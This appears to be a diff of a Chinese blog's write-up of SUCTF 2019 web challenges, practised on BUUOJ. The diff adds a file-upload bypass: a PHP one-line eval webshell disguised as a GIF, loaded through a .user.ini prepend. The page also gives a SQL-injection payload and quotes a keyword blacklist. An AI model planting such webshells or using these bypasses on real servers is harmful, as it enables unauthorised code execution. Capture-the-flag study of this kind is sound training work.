@@ -23,15 +23,15 @@
     var CONFIG = {"hostname":"yq1ng.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="[SUCTF 2019]EasySQL [SUCTF 2019]CheckIn [SUCTF 2019]Pythonginx">
+  <meta name="description" content="复现链接：https:&#x2F;&#x2F;buuoj.cn&#x2F;     [SUCTF 2019]EasySQL [SUCTF 2019]CheckIn [SUCTF 2019]Pythonginx">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SUCTF 2019 web 部分wp">
+<meta property="og:title" content="SUCTF 2019 web复现 部分wp">
 <meta property="og:url" content="http://yq1ng.github.io/z_post/SUCTF-2019/index.html">
 <meta property="og:site_name" content="会下雪的晴天">
-<meta property="og:description" content="[SUCTF 2019]EasySQL [SUCTF 2019]CheckIn [SUCTF 2019]Pythonginx">
+<meta property="og:description" content="复现链接：https:&#x2F;&#x2F;buuoj.cn&#x2F;     [SUCTF 2019]EasySQL [SUCTF 2019]CheckIn [SUCTF 2019]Pythonginx">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-11-30T14:26:13.000Z">
-<meta property="article:modified_time" content="2020-12-02T15:06:53.143Z">
+<meta property="article:modified_time" content="2020-12-08T15:39:00.761Z">
 <meta property="article:author" content="yq1ng">
 <meta name="twitter:card" content="summary">
 
@@ -48,7 +48,7 @@
   };
 </script>
 
-  <title>SUCTF 2019 web 部分wp | 会下雪的晴天</title>
+  <title>SUCTF 2019 web复现 部分wp | 会下雪的晴天</title>
   
 
 
@@ -196,7 +196,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          SUCTF 2019 web 部分wp
+          SUCTF 2019 web复现 部分wp
         </h1>
 
         <div class="post-meta">
@@ -213,7 +213,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-12-02 23:06:53" itemprop="dateModified" datetime="2020-12-02T23:06:53+08:00">2020-12-02</time>
+                <time title="修改时间：2020-12-08 23:39:00" itemprop="dateModified" datetime="2020-12-08T23:39:00+08:00">2020-12-08</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -238,14 +238,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>4.8k</span>
+              <span>6.3k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>8 分钟</span>
+              <span>11 分钟</span>
             </span>
 
         </div>
@@ -257,7 +257,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <!-- TOC -->
+        <blockquote>
+<p>复现链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/">https://buuoj.cn/</a></p>
+</blockquote>
+<!-- TOC -->
 
 <ul>
 <li><a href="#suctf-2019easysql">[SUCTF 2019]EasySQL</a></li>
@@ -267,7 +270,7 @@
 <!-- /TOC -->
 
 <a id="more"></a>
-<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>这题我也是懵了，过滤太多，堆叠最多查到表名<code>Flag</code>，看wp才知道怎么回事<br>sql:<code>select $_GET[&#39;query&#39;] || flag from flag</code></p>
+<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>这题我也是懵了，过滤太多，堆叠最多查到表名<code>Flag</code>，看wp才知道怎么回事<br>sql: <code>select $_GET[&#39;query&#39;] || flag from flag</code></p>
 <ul>
 <li><p>预期解<br>payload: <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code>，通过设置MySQL中<code>sql_mode</code>的<code>PIPES_AS_CONCAT</code>，将<code>||</code>变为字符串连接符而不是或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p>
 </li>
@@ -277,7 +280,15 @@
 <p>比赛时源码泄露了，这里贴出来</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line">    $post = <span class="keyword">array</span>();</span><br><span class="line">    $get = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">global</span> $MysqlLink;</span><br><span class="line">    <span class="comment">//GetPara();</span></span><br><span class="line">    $MysqlLink = mysqli_connect(<span class="string">&quot;localhost&quot;</span>,$datauser,$datapass);</span><br><span class="line">    <span class="keyword">if</span>(!$MysqlLink)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Mysql Connect Error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $selectDB = mysqli_select_db($MysqlLink,$dataName);</span><br><span class="line">    <span class="keyword">if</span>(!$selectDB)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Choose Database Error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($v)&amp;&amp;is_string($v))&#123;</span><br><span class="line">            $post[$k] = trim(addslashes($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//die();</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you <span class="keyword">if</span> the flag is right. &lt;/ a&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;query&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($post[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">        $BlackList = <span class="string">&quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|&quot;</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">        //var_dump(preg_match(&quot;</span>/&#123;$BlackList&#125;/is<span class="string">&quot;,<span class="subst">$post</span>[&#x27;query&#x27;]));</span></span><br><span class="line"><span class="string">        if(preg_match(&quot;</span>/&#123;$BlackList&#125;/is<span class="string">&quot;,<span class="subst">$post</span>[&#x27;query&#x27;]))&#123;</span></span><br><span class="line"><span class="string">            //echo <span class="subst">$post</span>[&#x27;query&#x27;];</span></span><br><span class="line"><span class="string">            die(&quot;</span>Nonono.<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if(strlen(<span class="subst">$post</span>[&#x27;query&#x27;])&gt;40)&#123;</span></span><br><span class="line"><span class="string">            die(&quot;</span>Too long.<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        <span class="subst">$sql</span> = &quot;</span>select <span class="string">&quot;.<span class="subst">$post</span>[&#x27;query&#x27;].&quot;</span>||flag <span class="keyword">from</span> Flag<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        mysqli_multi_query(<span class="subst">$MysqlLink</span>,<span class="subst">$sql</span>);</span></span><br><span class="line"><span class="string">        do&#123;</span></span><br><span class="line"><span class="string">            if(<span class="subst">$res</span> = mysqli_store_result(<span class="subst">$MysqlLink</span>))&#123;</span></span><br><span class="line"><span class="string">                while(<span class="subst">$row</span> = mysqli_fetch_row(<span class="subst">$res</span>))&#123;</span></span><br><span class="line"><span class="string">                    print_r(<span class="subst">$row</span>);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;while(@mysqli_next_result(<span class="subst">$MysqlLink</span>));</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h1><p>看名知意，给了部分源码，不过俺不会。。。老规矩，先给参考链接，以下可以不看，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/99741920">参考一</a>，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42812036/article/details/104291695">参考二</a></p>
+<h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>文件上传，fuzz后缀都失败了，随便上传图片有回显路径，且上传目录下有<code>index.php</code>，访问其出现<code>GIF89a?</code>文件头，上传js图片马，并加上<code>GIF89a</code>更改文件后缀为jpg/gif</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="built_in">eval</span>($_POST[<span class="string">&#x27;yq1ng&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>上传<code>.htaccess</code>失败，换姿势—-上传目录下有*.php文件也可以用用<code>.user.ini</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;js.jpg</span><br></pre></td></tr></table></figure>
+<p>蚁剑连接upload下的index.php即可<br>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6091">https://xz.aliyun.com/t/6091</a></p>
+<p>上传源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line">$userdir = <span class="string">&quot;uploads/&quot;</span> . md5($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($userdir . <span class="string">&quot;/index.php&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&quot;upload&quot;</span>])) &#123;</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    $name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!$tmp_name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;filesize too big!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;filename cannot be empty!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension = substr($name, strrpos($name, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/ph|htacess/i&quot;</span>, $extension)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;illegal suffix!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mb_strpos(file_get_contents($tmp_name), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&amp;lt;? in contents!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type = exif_imagetype($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> (!$image_type) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;exif_imagetype:not image!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path = $userdir . <span class="string">&quot;/&quot;</span> . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Your dir &quot;</span> . $userdir. <span class="string">&#x27; &lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your files : &lt;br&gt;&#x27;</span>;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h1><p>看名知意，给了部分源码，不过俺不会。。。老规矩，先给参考链接，以下可以不看，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/99741920">参考一</a>，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42812036/article/details/104291695">参考二</a></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">    @app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure>
 
 <p>源码两条提示</p>
@@ -334,7 +345,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://yq1ng.github.io/z_post/SUCTF-2019/" title="SUCTF 2019 web 部分wp">http://yq1ng.github.io/z_post/SUCTF-2019/</a>
+    <a href="http://yq1ng.github.io/z_post/SUCTF-2019/" title="SUCTF 2019 web复现 部分wp">http://yq1ng.github.io/z_post/SUCTF-2019/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -432,14 +443,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">48</span>
+          <span class="site-state-item-count">50</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -502,13 +513,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">269k</span>
+    <span title="站点总字数">289k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">7:28</span>
+    <span title="站点阅读时长">8:01</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
